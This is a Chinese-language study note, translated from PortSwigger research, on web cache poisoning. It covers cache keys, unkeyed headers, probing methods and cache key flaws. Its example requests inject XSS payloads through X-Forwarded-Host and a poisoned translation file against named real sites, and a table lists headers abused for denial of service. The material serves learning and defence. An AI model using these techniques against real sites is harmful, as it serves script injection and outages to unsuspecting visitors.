# WEB缓存中毒
> 本文 翻译整理自[实用的web缓存中毒](https://portswigger.net/research/practical-web-cache-poisoning)，记录仅作个人学习使用，侵删
## 缓存中毒（上）
### Caching 101
Web缓存位于用户和应用程序服务器之间，它们保存和提供某些响应的副本。在下图中，我们可以看到三个用户一个接一个地获取相同的资源：

![](../../网络安全/01.后端漏洞/media/Pasted%20image%2020231003235129.png)

### Cache keys
每当缓存收到一个资源的请求时，它需要决定是否已经保存了这个确切资源的副本，并可以用它来回复请求，还是需要将请求转发给应用服务器。逐字节匹配不现实，这就出现了`缓存键`解决问题~~（通常使用request-line和user-agent作为缓存键）~~
```java
GET /blog/post.php?mobile=1 HTTP/1.1  
Host: example.com  
User-Agent: Mozilla/5.0 … Firefox/57.0  
Cookie: language=pl;  
Connection: close
```

```java
GET /blog/post.php?mobile=1 HTTP/1.1  
Host: example.com  
User-Agent: Mozilla/5.0 … Firefox/57.0  
Cookie: language=en;  
Connection: close
```

在上述请求中，使用了HTTP方法`GET`和主机名`example.com` 以及请求路径`/blog/post.php` 和查询字符串`?mobile=1`来作为缓存建，可想而知，该页面将以错误的语言提供给第二个访问者
>这暗示了一个问题--由非缓存建触发的响应中的任何差异都可能被存储并提供给其他用户

#### 补充：
```
缓存通过使用缓存键（cache keys）的概念来解决这个问题 - 这是 HTTP 请求的一些特定组件，用于完全标识被请求的资源

缓存键通常包括用于唯一标识资源的以下元素：

1. **HTTP方法 (HTTP Method):** 这表示请求的类型，例如 GET、POST、PUT 或 DELETE。

2. **主机名 (Host Name):** 表示请求资源的主机名或域名，用于定位资源的来源。

3. **路径 (Path):** 表示请求资源的路径，即 URL 中主机名之后的部分。

4. **查询字符串 (Query String):** 表示查询参数，如果请求中包含查询参数，它们也会被包括在缓存键中。

```

### Cache Poisoning
Web缓存中毒的目的是发送导致有害响应的请求，这些响应被保存该高速缓存中并提供给其他用户。

![](../../网络安全/01.后端漏洞/media/Pasted%20image%2020231004000647.png)
1. HTTP头等非键控输入
2. HTTP响应拆分
3. 请求走私

### Methodology

![](../../网络安全/01.后端漏洞/media/Pasted%20image%2020231004172422.png)

1. 识别和评估非缓存建输入（Param Miner）
2. 从后端服务器获取有害响应~~(如果一个输入在没有被正确清理的情况下被反映在来自服务器的响应中，或者被用于动态生成其他数据，那么这就是Web缓存中毒的潜在入口点。)~~
3. 使响应缓存~~（是否缓存响应取决于各种因素，例如文件扩展名、内容类型、路由、状态代码和响应头。您可能需要花一些时间来处理不同页面上的请求，并研究该高速缓存的行为。一旦您知道如何缓存包含恶意输入的响应，就可以将漏洞攻击传递给潜在的受害者。）~~

### 实例分析


#### XSS
1. 识别和评估非缓存建输入（Param Miner）

![](media/Pasted%20image%2020231006151028.png)  
![](media/Pasted%20image%2020231006151112.png)  
![](media/Pasted%20image%2020231006151134.png)  

2. 从后端服务器获取有害响应
![](media/Pasted%20image%2020231006151220.png)   
在被自己的服务器上 将指向的脚本设为xss攻击脚本
![](media/Pasted%20image%2020231006152652.png)   
![](media/Pasted%20image%2020231006152956.png)  
3. 使响应缓存
X-Cache: hit 响应来自缓存
![](media/Pasted%20image%2020231006153251.png)  


#### Basic Poisoning
1. 找非缓存键
```code
GET /en?cb=1 HTTP/1.1  
Host: www.redhat.com  
X-Forwarded-Host:      **canary** 
  
HTTP/1.1 200 OK  
Cache-Control: public, no-cache  
…  
<meta property="og:image" content="https://  **canary **  /cms/social.png" />
```
2. 评估是否可利用
```code
GET /en?dontpoisoneveryone=1 HTTP/1.1  
Host: www.redhat.com  
X-Forwarded-Host:     **a."><script>alert(1)</script> **
  
HTTP/1.1 200 OK  
Cache-Control: public, no-cache  
…  
<meta property="og:image" content="https://   **a."><script>alert(1)</script>**  "/>
```
3. 检查此响应是否已存储在缓存中，以便将其传递给其他用户
```code
GET /en?dontpoisoneveryone=1 HTTP/1.1  
Host: www.redhat.com  
  
HTTP/1.1 200 OK  
…  
<meta property="og:image" content="https://a."><script>alert(1)</script>"/>
```

#### Discreet poisoning
1. 发送大量请求保证缓存，方法几乎不可用
2. 逆向目标的缓存到期系统并通过浏览文档和监控网站来预测准确的到期时间来避免这个问题，但这听起来就很难。
3. 响应协议头“Age”和“max-age”分别是当前响应的时间和它将过期的时间
```code
GET / HTTP/1.1
Host: unity3d.com
X-Host: portswigger-labs.net

HTTP/1.1 200 OK
Via: 1.1 varnish-v4
Age: 174
Cache-Control: public, max-age=1800
…
<script src="https://portswigger-labs.net/sites/files/foo.js"></script>
```


#### Selective Poisoning
“Vary” ：赋予的值代表缓存键.
```code
GET / HTTP/1.1  
Host: redacted.com  
User-Agent: Mozilla/5.0 … Firefox/60.0  
X-Forwarded-Host: a"><iframe onload=alert(1)>  
  
HTTP/1.1 200 OK  
X-Served-By: cache-lhr6335-LHR  
Vary: User-Agent, Accept-Encoding  
…  
<link rel="canonical" href="https://a">a<iframe onload=alert(1)>  
</iframe>
```
Vary头告诉我们，我们的User-Agent可能是该高速缓存键的一部分，手动测试证实了这一点。这意味着，由于我们声称使用Firefox 60，我们的漏洞将只提供给其他Firefox 60用户。~~我们可以使用流行的用户代理列表来确保大多数访问者收到我们的漏洞，但这种行为给了我们更多选择性攻击的选择。如果你知道他们的用户代理，你就有可能针对特定的人进行攻击，甚至可以隐藏自己的网站监控团队。~~

#### DOM Poisoning
利用未加密的输入并不总是像写入XSS Payload一样容易。如以下请求：

```
GET /dataset HTTP/1.1
Host: catalog.data.gov
X-Forwarded-Host: canary

HTTP/1.1 200 OK
Age: 32707
X-Cache: Hit from cloudfront 
…
<body data-site-root="https://canary/">
```

我们已经控制了'data-site-root'属性，但我们不能突破以使用XSS，并且不清楚这个属性甚至用于什么。为了找到答案，我在Burp中创建了一个匹配并替换的规则，为所有请求添加了“X-Forwarded-Host：id.burpcollaborator.net”协议头，然后浏览了该站点。当加载某些页面时，Firefox会将JavaScript生成的请求发送到我的服务器：

```
GET /api/i18n/en HTTP/1.1
Host: id.burpcollaborator.net
```

该路径表明，在网站的某个地方，有一些JavaScript代码使用data-site-root属性来决定从哪里加载一些国际数据。我试图通过获取[https://catalog.data.gov/api/i18n/en](https://catalog.data.gov/api/i18n/en) 来找出这些数据应该是什么样的，但只是收到了一个空的JSON响应。幸运的是，将'en'改为'es'拿到了一个线索：

```
GET /api/i18n/es HTTP/1.1
Host: catalog.data.gov

HTTP/1.1 200 OK
…
{"Show more":"Mostrar más"}
```

该文件包含用于将短语翻译为用户所选语言的地图。通过创建我们自己的翻译文件并使缓存投毒，我们可以将短语翻译变成漏洞：

```
GET  /api/i18n/en HTTP/1.1
Host: portswigger-labs.net

HTTP/1.1 200 OK
...
{"Show more":"<svg onload=alert(1)>"}
```

最终的结果，任何查看包含“显示更多”文字的网页的人都会被利用。

到此为止 ，更多内容请看paper

## 缓存中毒（下）
### Cache key flaws
在实践中，许多网站和CDN在保存该高速缓存键中时对键控组件执行各种转换。这可能包括：

- Excluding the query string 排除查询字符串
- Filtering out specific query parameters 过滤出特定查询参数
- Normalizing input in keyed components 规范化关键帧零部件中的输入

基于写入该高速缓存键的数据和传递到应用程序代码的数据之间的差异，缓存密钥缺陷可被利用来通过最初可能看起来不可用的输入（缓存建）来毒害该高速缓存。

### Cache probing methodology  

![](media/Pasted%20image%2020231008081214.png)  

1. Identify a suitable cache oracle 确定合适的缓存oracle
2. Probe key handling探测键处理
3. Identify an exploitable gadget识别可利用的小工具

#### Identify a suitable cache oracle
> 缓存oracle只是提供有关该高速缓存行为的反馈的页面或端点。这需要是可缓存的，并且必须以某种方式指示您是接收到缓存的响应还是直接从服务器接收到的响应。这种反馈可以采取各种形式，例如：
- An HTTP header that explicitly tells you whether you got a cache hit  
    一个HTTP标头，明确告诉您是否有缓存命中
- Observable changes to dynamic content 动态内容的可观察变化
- Distinct response times 独特的响应时间

~~理想情况下，该高速缓存oracle还将在响应中反映整个URL和至少一个查询参数。这将更容易注意到该高速缓存和应用程序之间的解析差异，这将有助于以后构建不同的漏洞。~~

查阅相应的文档。这可以包含关于如何构造默认缓存键的信息。您甚至可能会偶然发现一些方便的提示和技巧，例如允许您直接查看该高速缓存键的功能。例如，基于Akamai的网站可能支持标头`Pragma: akamai-x-get-cache-key`，您可以使用该标头在响应标头中显示该高速缓存键：

```javascript
GET /?param=1 HTTP/1.1 
Host: innocent-website.com 
Pragma: akamai-x-get-cache-key 


HTTP/1.1 200 
OK X-Cache-Key: innocent-website.com/?param=1
```

#### Probe key handling
测试更改缓存建的值 看是否改变响应
1. 正常请求
```javascript
GET / HTTP/1.1 
Host: vulnerable-website.com 

HTTP/1.1 302 Moved Permanently 
Location: https://vulnerable-website.com/en 
Cache-Status: miss
```
2. 改变Host的端口
```javascript
GET / HTTP/1.1 
Host: vulnerable-website.com:1337 

HTTP/1.1 302 Moved Permanently 
Location: https://vulnerable-website.com:1337/en 
Cache-Status: miss
```
3. 缓存后：
```javascript
GET / HTTP/1.1 
Host: vulnerable-website.com 

HTTP/1.1 302 Moved Permanently 
Location: https://vulnerable-website.com:1337/en 
Cache-Status: hit
```

#### Identify an exploitable gadget
1. 反射XSS/self-xss -> 存储xss
2. 开放重定向 -> 反射性xss/DOS/重定向恶意链接
3. waf拦截的铭感词 -> DOS
4. 允许利用资源文件中的动态内容，如JS和CSS。
5. 利用依赖于浏览器不会发送的格式错误的请求的“不可利用”漏洞。
6. ........

### 实例

#### Unkeyed port
> 高速缓存系统将解析报头并从该高速缓存键中排除端口
1. 正常请求
```javascript
GET / HTTP/1.1 
Host: vulnerable-website.com 

HTTP/1.1 302 Moved Permanently 
Location: https://vulnerable-website.com/en 
Cache-Status: miss
```
2. 改变Host的端口
```javascript
GET / HTTP/1.1 
Host: vulnerable-website.com:1337 

HTTP/1.1 302 Moved Permanently 
Location: https://vulnerable-website.com:1337/en 
Cache-Status: miss
```
3. 缓存后：
```javascript
GET / HTTP/1.1 
Host: vulnerable-website.com 

HTTP/1.1 302 Moved Permanently 
Location: https://vulnerable-website.com:1337/en 
Cache-Status: hit
```

#### Unkeyed query string
> 最常见的缓存键转换之一是排除整个查询字符串

##### Detecting an unkeyed query string
> 如果响应显式地告诉您是否命中了缓存，那么这种转换就相对容易发现，但是如果没有呢？很难知道您是在与该高速缓存还是服务器通信。
1. 可以通过在缓存建添加不干扰应用程序行为键值，来判断是否交互
```
Accept-Encoding: gzip, deflate, cachebuster 
Accept: */*, text/cachebuster 
Cookie: cachebuster=1 
Origin: https://cachebuster.vulnerable-website.com
```
2. 如果使用Param Miner，还可以选择“Add static/dynamic cache buster”和“Include cache buster in header”选项。然后，它将自动添加一个缓存buster到您使用Burp的手动测试工具发送的任何请求中的常用键控头。
3. 查看该高速缓存和后端规范化请求路径的方式之间是否存在任何差异。由于路径几乎可以保证是键控的，因此有时可以利用这一点发出具有不同键的请求，但这些请求仍然会命中同一个端点。例如`GET /`
```javascript
Apache: GET //   
Nginx:  GET /%2F   
PHP:  GET /index.php/xyz
```

##### Exploiting an unkeyed query string
这种攻击依赖于`诱导受害者访问恶意制作的URL`。然而，通过无键查询字符串该高速缓存将导致有效负载被提供给访问原本是`完全正常的URL`的用户。这有可能影响更多的受害者，而攻击者没有进一步的互动。
`xss/别的什么。。。。。``

#### Unkeyed query parameters
> 一些网站只排除与后端应用程序不相关的特定查询参数，例如用于分析或提供定向广告的参数。像`utm_content`这样的UTM参数是在测试期间检查的良好候选。

#### Cache parameter cloaking

## Tools
[Param Miner](https://github.com/PortSwigger/param-miner)
1. Guess header
2. Issue
## Paper
[实用的web缓存中毒](https://portswigger.net/research/practical-web-cache-poisoning)  
[web缓存中毒导致的dos](https://portswigger.net/research/responsible-denial-of-service-with-web-cache-poisoning)  
[**CPDoS**: **C**ache **P**oisoned **D**enial **o**f **S**ervice](https://cpdos.org/)  
[新的web缓存中毒](https://portswigger.net/research/web-cache-entanglement)


# WEB缓存欺骗

# [HTTP头](https://cloud.tencent.com/developer/chapter/13542)
| HTTP头 | 本身作用|缓存中毒应用|
|  ----  | ----  | --- |
|X-Forwarded-Port | 重定向端口 |定向未知端口DOS|
|X-Forwarded-SSL| 识别协议| 覆盖某些页面，并回复“Contradictory scheme header|
|Transfer-Encoding||覆盖某些页面，501|
|Accept-Encoding|
|Range: bytes=cow||拒绝访问加载JavaScript文件，以引起400响应|
`Accept`, `Upgrade`, `[Origin](https://nathandavison.com/blog/corsing-a-denial-of-service-via-cache-poisoning)` Max-Forwards

# CDN特性